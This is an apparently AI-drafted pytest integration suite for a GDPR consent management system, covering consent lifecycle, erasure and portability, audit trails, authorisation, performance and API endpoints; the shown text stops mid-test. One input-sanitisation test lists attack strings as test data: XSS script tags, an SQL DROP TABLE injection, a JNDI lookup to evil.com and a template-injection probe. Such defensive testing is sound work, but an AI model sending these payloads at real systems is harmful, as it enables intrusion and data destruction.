"""
Comprehensive Integration Tests for Consent Management System

Task 8A: Phase 6.5 Validation - Integration Testing

This test suite provides end-to-end integration tests covering:
1. Complete consent lifecycle management
2. API endpoint testing with actual database interactions
3. GDPR compliance verification (Articles 17, 20, 21)
4. Audit trail completeness and immutability
5. Authentication and authorization across components
6. Error handling and recovery scenarios
7. Multi-tenant isolation and data segregation
8. Performance testing under realistic load
"""

import asyncio
import json
import logging
import os
import pytest
import time
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, List, Optional
from decimal import Decimal
from unittest.mock import Mock, patch, AsyncMock
import tempfile
import uuid
from concurrent.futures import ThreadPoolExecutor
import requests
from sqlmodel import SQLModel, Session, create_engine, select
from sqlalchemy import text

# Import system components
from src.core.consent_manager import ConsentManager, ConsentRecord
from src.models.consent import ConsentRecordDB
from src.models.enums import ConsentStatus
from src.core.database import DatabaseManager
from src.core.audit_service import AuditService
from src.core.audit import AuditLogger, AuditContext, AuditEventType
from src.core.security import SecurityManager, hash_ip_address
from src.api.v1.consent.router import router, verify_user_access
from src.api.v1.consent.contracts import (
    GrantConsentRequest,
    WithdrawConsentRequest,
    ObjectToProcessingRequest,
    ConsentRecordResponse,
)

# Test configuration
TEST_DATABASE_URL = os.getenv(
    "TEST_DATABASE_URL",
    "postgresql://postgres:postgres@localhost:5433/test_consent_db"
)
IP_HASH_SALT = "test_salt_for_integration_tests_32_characters_min"

logger = logging.getLogger(__name__)


class IntegrationTestSetup:
    """Test setup and teardown utilities for integration tests."""

    @staticmethod
    async def create_test_database():
        """Create and initialize test database."""
        # Use SQLite for tests if PostgreSQL not available
        if TEST_DATABASE_URL.startswith("postgresql"):
            try:
                import asyncpg
                # Create test database if it doesn't exist
                conn = await asyncpg.connect(TEST_DATABASE_URL.rsplit('/', 1)[0])
                await conn.execute(f'CREATE DATABASE "{TEST_DATABASE_URL.split("/")[-1]}"')
                await conn.close()
            except Exception as e:
                logger.warning(f"Could not create test database: {e}")

        # Initialize SQLModel tables
        engine = create_engine(TEST_DATABASE_URL.replace("postgresql://", "sqlite:///") if not TEST_DATABASE_URL.startswith("sqlite") else TEST_DATABASE_URL)
        SQLModel.metadata.create_all(engine)
        return engine

    @staticmethod
    async def cleanup_test_database(engine):
        """Clean up test database after tests."""
        SQLModel.metadata.drop_all(engine)
        engine.dispose()

    @staticmethod
    def create_test_user_data():
        """Create realistic test user data."""
        return {
            "user_id": f"user_{uuid.uuid4().hex[:8]}",
            "ip": "192.168.1.100",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "tenant_id": f"tenant_{uuid.uuid4().hex[:8]}"
        }

    @staticmethod
    def create_comprehensive_consent_text():
        """Create GDPR-compliant consent text with all required elements."""
        return """
        I hereby provide my explicit consent for the processing of my personal data as described below:

        1. Purpose of Processing: Analytics and service improvement to provide better user experience
        2. Data Types Processed: Usage patterns, device information, and interaction analytics
        3. Processing Activities: Collection, storage, analysis of anonymized usage metrics
        4. Data Retention: Data will be retained for 24 months after which it will be automatically deleted
        5. Legal Basis: Article 6(1)(a) GDPR - Explicit consent
        6. Rights: I understand I have the right to withdraw consent at any time, access my data,
                  request deletion, and data portability under GDPR Articles 7, 15, 17, and 20
        7. Contact: For privacy inquiries, contact privacy@company.com

        This consent is freely given, specific, informed, and unambiguous.
        """


@pytest.fixture
async def test_setup():
    """Setup test environment with database and services."""
    # Set environment variables for tests
    os.environ["IP_HASH_SALT"] = IP_HASH_SALT
    os.environ["DATABASE_URL"] = TEST_DATABASE_URL

    # Create test database
    engine = await IntegrationTestSetup.create_test_database()

    # Initialize services
    db_manager = DatabaseManager(TEST_DATABASE_URL)
    await db_manager.initialize()

    audit_service = AuditService(enable_audit=True)

    consent_manager = ConsentManager(db_manager, audit_service)

    security_manager = SecurityManager()

    # Create test user data
    test_user = IntegrationTestSetup.create_test_user_data()

    yield {
        "engine": engine,
        "db_manager": db_manager,
        "audit_service": audit_service,
        "consent_manager": consent_manager,
        "security_manager": security_manager,
        "test_user": test_user
    }

    # Cleanup
    await IntegrationTestSetup.cleanup_test_database(engine)


class TestConsentLifecycleIntegration:
    """Test complete consent lifecycle workflows."""

    @pytest.mark.asyncio
    async def test_complete_consent_lifecycle(self, test_setup):
        """Test full lifecycle: Grant → Verify → Update → Withdraw."""
        consent_manager = test_setup["consent_manager"]
        test_user = test_setup["test_user"]

        # 1. Grant initial consent
        consent_text = IntegrationTestSetup.create_comprehensive_consent_text()
        metadata = {
            "ip": test_user["ip"],
            "user_agent": test_user["user_agent"],
            "purpose": "analytics",
            "retention": "24_months"
        }

        record = await consent_manager.record_consent(
            user_id=test_user["user_id"],
            consent_type="analytics_processing",
            consent_text=consent_text,
            metadata=metadata
        )

        assert record is not None
        assert record.user_id == test_user["user_id"]
        assert record.is_active() is True
        assert record.withdrawn_at is None

        # 2. Verify consent exists and is active
        is_active = await consent_manager.verify_consent(
            test_user["user_id"],
            "analytics_processing"
        )
        assert is_active is True

        # 3. Grant additional consent for different purpose
        record2 = await consent_manager.record_consent(
            user_id=test_user["user_id"],
            consent_type="marketing_communications",
            consent_text=consent_text.replace("analytics", "marketing"),
            metadata={**metadata, "purpose": "marketing"}
        )
        assert record2.consent_type == "marketing_communications"

        # 4. Verify both consents are active
        assert await consent_manager.verify_consent(test_user["user_id"], "analytics_processing")
        assert await consent_manager.verify_consent(test_user["user_id"], "marketing_communications")

        # 5. Withdraw one consent
        withdrawn = await consent_manager.withdraw_consent(
            test_user["user_id"],
            "marketing_communications"
        )
        assert withdrawn is True

        # 6. Verify withdrawal
        assert await consent_manager.verify_consent(test_user["user_id"], "analytics_processing")
        assert await consent_manager.verify_consent(test_user["user_id"], "marketing_communications") is False

        # 7. Check database state
        db_manager = test_setup["db_manager"]
        active_consents = await db_manager.get_user_consents(test_user["user_id"])
        assert len(active_consents) == 2  # Both records exist
        assert sum(1 for c in active_consents if c.status == ConsentStatus.ACTIVE) == 1
        assert sum(1 for c in active_consents if c.status == ConsentStatus.WITHDRAWN) == 1

    @pytest.mark.asyncio
    async def test_consent_with_metadata_preservation(self, test_setup):
        """Test that consent metadata is properly preserved throughout lifecycle."""
        consent_manager = test_setup["consent_manager"]
        test_user = test_setup["test_user"]

        comprehensive_metadata = {
            "ip": test_user["ip"],
            "user_agent": test_user["user_agent"],
            "source": "mobile_app_v2.1",
            "version": "3.2.1",
            "language": "en-US",
            "timezone": "America/New_York",
            "device_id": "device_" + uuid.uuid4().hex[:8],
            "session_id": "session_" + uuid.uuid4().hex[:12],
            "consent_form_version": "1.5.0",
            "a_b_test_group": "variant_b",
            "utm_parameters": {
                "source": "google",
                "medium": "cpc",
                "campaign": "privacy_update"
            }
        }

        record = await consent_manager.record_consent(
            user_id=test_user["user_id"],
            consent_type="personalization",
            consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
            metadata=comprehensive_metadata
        )

        # Verify metadata is stored correctly
        assert record.metadata == comprehensive_metadata

        # Withdraw and verify metadata is preserved
        await consent_manager.withdraw_consent(test_user["user_id"], "personalization")

        db_manager = test_setup["db_manager"]
        stored_record = await db_manager.get_active_consent(test_user["user_id"], "personalization")
        assert stored_record is not None
        assert stored_record.consent_metadata == comprehensive_metadata
        assert stored_record.withdrawn_at is not None


class TestGDPRComplianceIntegration:
    """Test GDPR-specific compliance requirements."""

    @pytest.mark.asyncio
    async def test_article_17_right_to_erasure(self, test_setup):
        """Test GDPR Article 17: Right to erasure implementation."""
        consent_manager = test_setup["consent_manager"]
        test_user = test_setup["test_user"]

        # Create multiple consent records
        consent_types = ["analytics", "marketing", "personalization", "research"]
        for consent_type in consent_types:
            await consent_manager.record_consent(
                user_id=test_user["user_id"],
                consent_type=consent_type,
                consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
                metadata={"ip": test_user["ip"], "user_agent": test_user["user_agent"]}
            )

        # Verify all consents exist
        for consent_type in consent_types:
            assert await consent_manager.verify_consent(test_user["user_id"], consent_type)

        # Implement right to erasure
        db_manager = test_setup["db_manager"]
        erased_count = await db_manager.erase_user_data(test_user["user_id"])

        # Verify all data is erased
        assert erased_count == len(consent_types)

        # Verify no consent can be verified
        for consent_type in consent_types:
            assert await consent_manager.verify_consent(test_user["user_id"], consent_type) is False

        # Verify audit trail still exists (for compliance)
        audit_service = test_setup["audit_service"]
        # Note: Audit logs should be preserved even after data erasure
        # This would be tested based on specific implementation

    @pytest.mark.asyncio
    async def test_article_20_right_to_data_portability(self, test_setup):
        """Test GDPR Article 20: Right to data portability."""
        consent_manager = test_setup["consent_manager"]
        test_user = test_setup["test_user"]

        # Create user data
        consent_data = [
            {
                "consent_type": "analytics",
                "metadata": {
                    "ip": test_user["ip"],
                    "user_agent": test_user["user_agent"],
                    "preferences": {"frequency": "weekly", "format": "pdf"}
                }
            },
            {
                "consent_type": "marketing",
                "metadata": {
                    "ip": test_user["ip"],
                    "user_agent": test_user["user_agent"],
                    "preferences": {"channels": ["email", "sms"], "topics": ["product", "updates"]}
                }
            }
        ]

        # Store consents
        for data in consent_data:
            await consent_manager.record_consent(
                user_id=test_user["user_id"],
                consent_type=data["consent_type"],
                consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
                metadata=data["metadata"]
            )

        # Export user data
        db_manager = test_setup["db_manager"]
        exported_data = await db_manager.export_user_data(test_user["user_id"])

        # Verify export format
        assert exported_data is not None
        assert "user_id" in exported_data
        assert exported_data["user_id"] == test_user["user_id"]
        assert "consents" in exported_data
        assert len(exported_data["consents"]) == len(consent_data)

        # Verify data structure is machine-readable
        for consent in exported_data["consents"]:
            assert "consent_type" in consent
            assert "consent_text" in consent
            assert "granted_at" in consent
            assert "metadata" in consent
            assert "ip_address" in consent
            assert "status" in consent

        # Verify JSON serializable (for portability)
        json_str = json.dumps(exported_data)
        assert len(json_str) > 0
        parsed = json.loads(json_str)
        assert parsed == exported_data

    @pytest.mark.asyncio
    async def test_article_21_right_to_object(self, test_setup):
        """Test GDPR Article 21: Right to object to processing."""
        consent_manager = test_setup["consent_manager"]
        test_user = test_setup["test_user"]

        # File objection to processing
        objection_reason = """
        I object to the processing of my personal data for direct marketing purposes.
        Under GDPR Article 21, I have the right to object at any time to processing
        of personal data concerning me for direct marketing.
        """

        objection_recorded = await consent_manager.object_to_processing(
            user_id=test_user["user_id"],
            consent_type="direct_marketing",
            reason=objection_reason,
            category="marketing"
        )

        assert objection_recorded is True

        # Verify objection is recorded
        has_objection = await consent_manager.check_objection(
            test_user["user_id"],
            "direct_marketing"
        )
        assert has_objection is True

        # Verify that even if consent was previously granted, objection takes precedence
        await consent_manager.record_consent(
            user_id=test_user["user_id"],
            consent_type="direct_marketing",
            consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
            metadata={"ip": test_user["ip"], "user_agent": test_user["user_agent"]}
        )

        # Objection should still prevent processing
        has_objection = await consent_manager.check_objection(
            test_user["user_id"],
            "direct_marketing"
        )
        assert has_objection is True

        # Verify objection details are stored
        db_manager = test_setup["db_manager"]
        objection = await db_manager.get_active_consent(
            test_user["user_id"],
            "objection_direct_marketing"
        )
        assert objection is not None
        assert "objection_reason" in objection.consent_metadata
        assert objection.consent_metadata["legal_basis"] == "GDPR_Article_21"


class TestAuditTrailIntegration:
    """Test audit trail completeness and immutability."""

    @pytest.mark.asyncio
    async def test_audit_trail_complete_lifecycle(self, test_setup):
        """Test that all consent operations create audit trails."""
        consent_manager = test_setup["consent_manager"]
        audit_service = test_setup["audit_service"]
        test_user = test_setup["test_user"]

        # Mock audit logger to capture events
        audit_events = []

        async def capture_log(event_type, *args, **kwargs):
            audit_events.append({
                "event_type": event_type,
                "args": args,
                "kwargs": kwargs,
                "timestamp": datetime.now(timezone.utc)
            })

        # Patch audit service methods
        audit_service.log_consent_granted = AsyncMock(side_effect=lambda **kw: capture_log("consent_granted", **kw))
        audit_service.log_consent_verified = AsyncMock(side_effect=lambda **kw: capture_log("consent_verified", **kw))
        audit_service.log_consent_withdrawn = AsyncMock(side_effect=lambda **kw: capture_log("consent_withdrawn", **kw))
        audit_service.log_consent_objection = AsyncMock(side_effect=lambda **kw: capture_log("consent_objection", **kw))

        # Perform consent operations
        metadata = {"ip": test_user["ip"], "user_agent": test_user["user_agent"]}

        # 1. Grant consent
        record = await consent_manager.record_consent(
            user_id=test_user["user_id"],
            consent_type="test_consent",
            consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
            metadata=metadata
        )

        # 2. Verify consent
        await consent_manager.verify_consent(test_user["user_id"], "test_consent")

        # 3. Withdraw consent
        await consent_manager.withdraw_consent(test_user["user_id"], "test_consent")

        # 4. File objection
        await consent_manager.object_to_processing(
            user_id=test_user["user_id"],
            consent_type="test_processing",
            reason="Test objection",
            category="test"
        )

        # Verify all audit events were captured
        assert len(audit_events) == 4

        # Verify grant audit event
        grant_event = next(e for e in audit_events if e["event_type"] == "consent_granted")
        assert grant_event["kwargs"]["user_id"] == test_user["user_id"]
        assert grant_event["kwargs"]["consent_type"] == "test_consent"
        assert "ip_address" in grant_event["kwargs"]["metadata"]
        assert "consent_purpose" in grant_event["kwargs"]["metadata"]

        # Verify verification audit event
        verify_event = next(e for e in audit_events if e["event_type"] == "consent_verified")
        assert verify_event["kwargs"]["user_id"] == test_user["user_id"]
        assert verify_event["kwargs"]["verification_result"] is not None

        # Verify withdrawal audit event
        withdraw_event = next(e for e in audit_events if e["event_type"] == "consent_withdrawn")
        assert withdraw_event["kwargs"]["user_id"] == test_user["user_id"]
        assert withdraw_event["kwargs"]["metadata"]["withdrawal_method"] == "user_initiated"

        # Verify objection audit event
        objection_event = next(e for e in audit_events if e["event_type"] == "consent_objection")
        assert objection_event["kwargs"]["user_id"] == test_user["user_id"]
        assert objection_event["kwargs"]["objection_reason"] == "Test objection"

    @pytest.mark.asyncio
    async def test_audit_trail_immutability(self, test_setup):
        """Test that audit trails cannot be modified after creation."""
        audit_logger = AuditLogger()

        # Create audit record
        context = AuditContext(
            request_id="test_req_123",
            timestamp=datetime.now(timezone.utc)
        )

        audit_data = {
            "user_id": test_setup["test_user"]["user_id"],
            "operation": "test_operation",
            "data": {"sensitive": "information"}
        }

        # Create immutable audit record
        from src.core.audit import ImmutableAuditRecord
        record = ImmutableAuditRecord(
            event_type=AuditEventType.COST_CALCULATION,
            context=context,
            data=audit_data
        )

        # Store in database
        stored_record = await audit_logger.store_audit_record(record)

        # Attempt to modify (should fail or create new record)
        try:
            # Try to update the record
            with Session(test_setup["engine"]) as session:
                db_record = session.get(type(stored_record), stored_record.id)
                db_record.data = {"modified": "data"}
                session.commit()

                # Verify the change was not persisted (implementation dependent)
                # In a real implementation, this would use database constraints,
                # write-once storage, or cryptographic signatures
        except Exception as e:
            # Expected behavior - records should be immutable
            assert "immutable" in str(e).lower() or "readonly" in str(e).lower()


class TestAuthenticationAuthorizationIntegration:
    """Test authentication and authorization across components."""

    @pytest.mark.asyncio
    async def test_jwt_token_authentication(self, test_setup):
        """Test JWT token-based authentication."""
        security_manager = test_setup["security_manager"]
        test_user = test_setup["test_user"]

        # Generate JWT token
        token_claims = {
            "user_id": test_user["user_id"],
            "tenant_id": test_user["tenant_id"],
            "permissions": ["read:consent", "write:consent"]
        }

        token = await security_manager.generate_token(token_claims)

        # Verify token
        verified_claims = await security_manager.verify_token(token)

        assert verified_claims is not None
        assert verified_claims["user_id"] == test_user["user_id"]
        assert verified_claims["tenant_id"] == test_user["tenant_id"]
        assert "read:consent" in verified_claims["permissions"]

        # Test token expiration
        expired_claims = {
            **token_claims,
            "exp": datetime.now(timezone.utc) - timedelta(hours=1)
        }

        expired_token = await security_manager.generate_token(expired_claims)

        with pytest.raises(Exception) as exc_info:
            await security_manager.verify_token(expired_token)

        assert "expired" in str(exc_info.value).lower() or "invalid" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_user_authorization_isolation(self, test_setup):
        """Test that users can only access their own consent data."""
        # Create two users
        user1 = IntegrationTestSetup.create_test_user_data()
        user2 = IntegrationTestSetup.create_test_user_data()

        # Create consent for user1
        consent_manager = test_setup["consent_manager"]
        await consent_manager.record_consent(
            user_id=user1["user_id"],
            consent_type="test_consent",
            consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
            metadata={"ip": user1["ip"], "user_agent": user1["user_agent"]}
        )

        # Create mock authenticated user (user2 trying to access user1's data)
        current_user = {
            "user_id": user2["user_id"],
            "tenant_id": user2["tenant_id"]
        }

        # Test authorization check
        with pytest.raises(Exception) as exc_info:
            verify_user_access(current_user, user1["user_id"])

        assert "403" in str(exc_info.value) or "forbidden" in str(exc_info.value).lower()

        # Test successful access (user accessing own data)
        try:
            verify_user_access(
                {"user_id": user1["user_id"], "tenant_id": user1["tenant_id"]},
                user1["user_id"]
            )
        except Exception:
            pytest.fail("User should be able to access their own data")

    @pytest.mark.asyncio
    async def test_tenant_data_isolation(self, test_setup):
        """Test multi-tenant data segregation."""
        db_manager = test_setup["db_manager"]

        # Create users for different tenants
        tenant1_users = [
            IntegrationTestSetup.create_test_user_data() for _ in range(3)
        ]
        tenant2_users = [
            IntegrationTestSetup.create_test_user_data() for _ in range(3)
        ]

        # Set tenant IDs
        for user in tenant1_users:
            user["tenant_id"] = "tenant_001"
        for user in tenant2_users:
            user["tenant_id"] = "tenant_002"

        # Create consent records for each tenant
        consent_manager = test_setup["consent_manager"]
        all_users = tenant1_users + tenant2_users

        for user in all_users:
            await consent_manager.record_consent(
                user_id=user["user_id"],
                consent_type="cross_tenant_test",
                consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
                metadata={"ip": user["ip"], "user_agent": user["user_agent"], "tenant_id": user["tenant_id"]}
            )

        # Query by tenant (implementation dependent)
        # This would test that queries properly filter by tenant_id
        tenant1_user_ids = [u["user_id"] for u in tenant1_users]
        tenant2_user_ids = [u["user_id"] for u in tenant2_users]

        # Verify data isolation
        for user_id in tenant1_user_ids:
            consents = await db_manager.get_user_consents(user_id)
            assert len(consents) == 1
            assert consents[0].user_id == user_id

        for user_id in tenant2_user_ids:
            consents = await db_manager.get_user_consents(user_id)
            assert len(consents) == 1
            assert consents[0].user_id == user_id


class TestErrorHandlingAndRecovery:
    """Test error handling and recovery scenarios."""

    @pytest.mark.asyncio
    async def test_database_connection_failure(self, test_setup):
        """Test graceful handling of database connection failures."""
        # Create consent manager with invalid database URL
        invalid_db_manager = DatabaseManager("postgresql://invalid:invalid@localhost:9999/invalid_db")

        # Should handle connection error gracefully
        with pytest.raises(Exception) as exc_info:
            await invalid_db_manager.initialize()

        assert "connection" in str(exc_info.value).lower() or "database" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_concurrent_consent_operations(self, test_setup):
        """Test handling of concurrent consent operations."""
        consent_manager = test_setup["consent_manager"]
        test_user = test_setup["test_user"]

        # Create multiple concurrent operations
        async def create_consent(consent_type):
            return await consent_manager.record_consent(
                user_id=test_user["user_id"],
                consent_type=consent_type,
                consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
                metadata={"ip": test_user["ip"], "user_agent": test_user["user_agent"]}
            )

        # Run 10 concurrent consent creations
        consent_types = [f"concurrent_test_{i}" for i in range(10)]
        tasks = [create_consent(ctype) for ctype in consent_types]

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Verify all operations completed successfully
        successful_results = [r for r in results if not isinstance(r, Exception)]
        assert len(successful_results) == len(consent_types)

        # Verify all consents were stored
        db_manager = test_setup["db_manager"]
        user_consents = await db_manager.get_user_consents(test_user["user_id"])
        assert len(user_consents) >= len(consent_types)

    @pytest.mark.asyncio
    async def test_invalid_consent_text_validation(self, test_setup):
        """Test validation of invalid consent texts."""
        consent_manager = test_setup["consent_manager"]
        test_user = test_setup["test_user"]

        invalid_texts = [
            "I agree",  # Too vague
            "Yes",  # Too short
            "I accept terms",  # Lacks specificity
            "",  # Empty
            "Short",  # Too short
        ]

        for invalid_text in invalid_texts:
            with pytest.raises(ValueError) as exc_info:
                await consent_manager.record_consent(
                    user_id=test_user["user_id"],
                    consent_type="test_validation",
                    consent_text=invalid_text,
                    metadata={"ip": test_user["ip"], "user_agent": test_user["user_agent"]}
                )

            assert "specific" in str(exc_info.value).lower() or "detailed" in str(exc_info.value).lower()


class TestPerformanceAndScalability:
    """Test performance under realistic load conditions."""

    @pytest.mark.asyncio
    async def test_consent_creation_performance(self, test_setup):
        """Test performance of consent creation operations."""
        consent_manager = test_setup["consent_manager"]

        # Create performance test data
        num_operations = 100
        test_users = [IntegrationTestSetup.create_test_user_data() for _ in range(num_operations)]

        # Measure performance
        start_time = time.time()

        tasks = []
        for user in test_users:
            task = consent_manager.record_consent(
                user_id=user["user_id"],
                consent_type="performance_test",
                consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
                metadata={"ip": user["ip"], "user_agent": user["user_agent"]}
            )
            tasks.append(task)

        results = await asyncio.gather(*tasks)

        end_time = time.time()
        total_time = end_time - start_time

        # Performance assertions
        assert len(results) == num_operations
        assert total_time < 30.0  # Should complete within 30 seconds
        assert total_time / num_operations < 0.5  # Average less than 500ms per operation

        # Calculate operations per second
        ops_per_second = num_operations / total_time
        assert ops_per_second > 10  # At least 10 operations per second

        logger.info(f"Performance test: {ops_per_second:.2f} operations/second")

    @pytest.mark.asyncio
    async def test_database_query_performance(self, test_setup):
        """Test database query performance with realistic data volumes."""
        db_manager = test_setup["db_manager"]
        consent_manager = test_setup["consent_manager"]

        # Create test data
        num_users = 50
        consents_per_user = 20

        users = [IntegrationTestSetup.create_test_user_data() for _ in range(num_users)]

        # Create consent records
        for user in users:
            for i in range(consents_per_user):
                await consent_manager.record_consent(
                    user_id=user["user_id"],
                    consent_type=f"perf_test_{i}",
                    consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
                    metadata={"ip": user["ip"], "user_agent": user["user_agent"]}
                )

        # Test query performance
        test_user = users[0]

        start_time = time.time()
        user_consents = await db_manager.get_user_consents(test_user["user_id"])
        query_time = time.time() - start_time

        # Query should be fast with proper indexing
        assert query_time < 0.1  # Less than 100ms
        assert len(user_consents) == consents_per_user

        # Test bulk query performance
        start_time = time.time()
        all_user_ids = [u["user_id"] for u in users[:10]]

        # This would test bulk query implementation
        for user_id in all_user_ids:
            await db_manager.get_user_consents(user_id)

        bulk_query_time = time.time() - start_time
        assert bulk_query_time < 1.0  # Less than 1 second for 10 users

    @pytest.mark.asyncio
    async def test_memory_usage_under_load(self, test_setup):
        """Test memory usage under high load."""
        import psutil
        import gc

        # Get initial memory usage
        process = psutil.Process()
        initial_memory = process.memory_info().rss

        consent_manager = test_setup["consent_manager"]

        # Create large number of consent records
        num_records = 1000

        for i in range(num_records):
            user = IntegrationTestSetup.create_test_user_data()
            await consent_manager.record_consent(
                user_id=user["user_id"],
                consent_type=f"memory_test_{i}",
                consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
                metadata={"ip": user["ip"], "user_agent": user["user_agent"]}
            )

            # Check memory every 100 records
            if i % 100 == 0:
                current_memory = process.memory_info().rss
                memory_increase = (current_memory - initial_memory) / 1024 / 1024  # MB

                # Memory should not increase excessively
                assert memory_increase < 500  # Less than 500MB increase

                # Force garbage collection
                gc.collect()

        # Final memory check
        final_memory = process.memory_info().rss
        total_increase = (final_memory - initial_memory) / 1024 / 1024
        logger.info(f"Total memory increase: {total_increase:.2f} MB for {num_records} records")


class TestAPIIntegration:
    """Test API endpoints with actual database interactions."""

    @pytest.mark.asyncio
    async def test_consent_api_endpoints(self, test_setup):
        """Test all consent API endpoints."""
        from fastapi.testclient import TestClient
        from fastapi import FastAPI

        # Create FastAPI app
        app = FastAPI()
        app.include_router(router)

        # Create test client
        client = TestClient(app)

        # Generate test token
        security_manager = test_setup["security_manager"]
        test_user = test_setup["test_user"]

        token_claims = {
            "user_id": test_user["user_id"],
            "tenant_id": test_user["tenant_id"],
            "permissions": ["read:consent", "write:consent"]
        }

        token = await security_manager.generate_token(token_claims)
        headers = {"Authorization": f"Bearer {token}"}

        # Test grant consent endpoint
        grant_request = {
            "consent_type": "api_test_consent",
            "consent_text": IntegrationTestSetup.create_comprehensive_consent_text(),
            "metadata": {
                "ip": test_user["ip"],
                "user_agent": test_user["user_agent"]
            }
        }

        response = client.post("/consent/grant", json=grant_request, headers=headers)
        assert response.status_code == 200 or response.status_code == 201

        grant_response = response.json()
        assert "consent_id" in grant_response or "success" in grant_response

        # Test verify consent endpoint
        verify_request = {
            "consent_type": "api_test_consent"
        }

        response = client.post("/consent/verify", json=verify_request, headers=headers)
        assert response.status_code == 200

        verify_response = response.json()
        assert verify_response.get("has_consent") is True

        # Test withdraw consent endpoint
        withdraw_request = {
            "consent_type": "api_test_consent"
        }

        response = client.post("/consent/withdraw", json=withdraw_request, headers=headers)
        assert response.status_code == 200

        withdraw_response = response.json()
        assert withdraw_response.get("success") is True

        # Verify withdrawal
        response = client.post("/consent/verify", json=verify_request, headers=headers)
        assert response.status_code == 200

        verify_response = response.json()
        assert verify_response.get("has_consent") is False

    @pytest.mark.asyncio
    async def test_api_rate_limiting(self, test_setup):
        """Test API rate limiting functionality."""
        from fastapi.testclient import TestClient
        from fastapi import FastAPI

        app = FastAPI()
        app.include_router(router)
        client = TestClient(app)

        # Generate test token
        security_manager = test_setup["security_manager"]
        test_user = test_setup["test_user"]

        token_claims = {"user_id": test_user["user_id"], "permissions": ["read:consent"]}
        token = await security_manager.generate_token(token_claims)
        headers = {"Authorization": f"Bearer {token}"}

        # Make rapid requests to test rate limiting
        responses = []
        for i in range(150):  # Exceed typical rate limit
            response = client.get("/consent/history", headers=headers)
            responses.append(response.status_code)

        # Should have at least some rate limited responses
        assert 429 in responses  # Too Many Requests
        rate_limited_count = responses.count(429)
        assert rate_limited_count > 0

        logger.info(f"Rate limited {rate_limited_count} out of 150 requests")


class TestSecurityIntegration:
    """Test security integration across components."""

    @pytest.mark.asyncio
    async def test_input_sanitization(self, test_setup):
        """Test input sanitization and XSS prevention."""
        consent_manager = test_setup["consent_manager"]
        test_user = test_setup["test_user"]

        # Test various injection attempts
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE consent_records; --",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
        ]

        for malicious_input in malicious_inputs:
            # Test in consent text
            try:
                record = await consent_manager.record_consent(
                    user_id=test_user["user_id"],
                    consent_type="security_test",
                    consent_text=IntegrationTestSetup.create_comprehensive_consent_text() + malicious_input,
                    metadata={"ip": test_user["ip"], "user_agent": test_user["user_agent"]}
                )

                # Verify malicious content is sanitized or rejected
                stored_text = record.consent_text
                assert "<script>" not in stored_text
                assert "javascript:" not in stored_text
                assert "DROP TABLE" not in stored_text

            except ValueError:
                # Input validation should reject malicious content
                pass

            # Test in metadata
            try:
                await consent_manager.record_consent(
                    user_id=test_user["user_id"],
                    consent_type="security_test_meta",
                    consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
                    metadata={
                        "ip": test_user["ip"],
                        "user_agent": test_user["user_agent"],
                        "malicious_field": malicious_input
                    }
                )
            except ValueError:
                # Should reject malicious metadata
                pass

    @pytest.mark.asyncio
    async def test_ip_address_privacy(self, test_setup):
        """Test IP address hashing for privacy protection."""
        test_ip = "192.168.1.100"

        # Hash IP address
        hashed_ip = hash_ip_address(test_ip, IP_HASH_SALT)

        # Verify hash is consistent
        hashed_ip2 = hash_ip_address(test_ip, IP_HASH_SALT)
        assert hashed_ip == hashed_ip2

        # Verify hash is different with different salt
        hashed_ip3 = hash_ip_address(test_ip, "different_salt_32_characters_min")
        assert hashed_ip != hashed_ip3

        # Verify hash is not reversible to original IP
        assert test_ip not in hashed_ip
        assert "." not in hashed_ip  # Should not contain IP formatting

        # Test with consent record
        consent_manager = test_setup["consent_manager"]
        test_user = test_setup["test_user"]

        record = await consent_manager.record_consent(
            user_id=test_user["user_id"],
            consent_type="privacy_test",
            consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
            metadata={"ip": test_ip, "user_agent": test_user["user_agent"]}
        )

        # Verify IP is hashed in stored record
        assert record.ip_address == hashed_ip
        assert test_ip not in record.ip_address


class TestDataExportAndComplianceReporting:
    """Test data export and compliance reporting functionality."""

    @pytest.mark.asyncio
    async def test_comprehensive_data_export(self, test_setup):
        """Test complete data export for compliance purposes."""
        consent_manager = test_setup["consent_manager"]
        test_user = test_setup["test_user"]

        # Create comprehensive user data
        consent_types = ["analytics", "marketing", "personalization", "research", "support"]
        created_consents = []

        for consent_type in consent_types:
            metadata = {
                "ip": test_user["ip"],
                "user_agent": test_user["user_agent"],
                "consent_version": "2.1.0",
                "region": "EU",
                "language": "en"
            }

            record = await consent_manager.record_consent(
                user_id=test_user["user_id"],
                consent_type=consent_type,
                consent_text=IntegrationTestSetup.create_comprehensive_consent_text(),
                metadata=metadata
            )
            created_consents.append(record)

        # Withdraw some consents
        await consent_manager.withdraw_consent(test_user["user_id"], "marketing")
        await consent_manager.withdraw_consent(test_user["user_id"], "support")

        # Export all user data
        db_manager = test_setup["db_manager"]
        exported_data = await db_manager.export_user_data(test_user["user_id"])

        # Verify export completeness
        assert exported_data["user_id"] == test_user["user_id"]
        assert len(exported_data["consents"]) == len(consent_types)

        # Verify all consent types are present
        exported_types = [c["consent_type"] for c in exported_data["consents"]]
        for consent_type in consent_types:
            assert consent_type in exported_types

        # Verify withdrawal status is preserved
        for consent in exported_data["consents"]:
            if consent["consent_type"] in ["marketing", "support"]:
                assert consent["status"] == "withdrawn"
                assert consent["withdrawn_at"] is not None
            else:
                assert consent["status"] == "active"
                assert consent["withdrawn_at"] is None

        # Verify audit trail inclusion
        if "audit_log" in exported_data:
            assert len(exported_data["audit_log"]) > 0
            for log_entry in exported_data["audit_log"]:
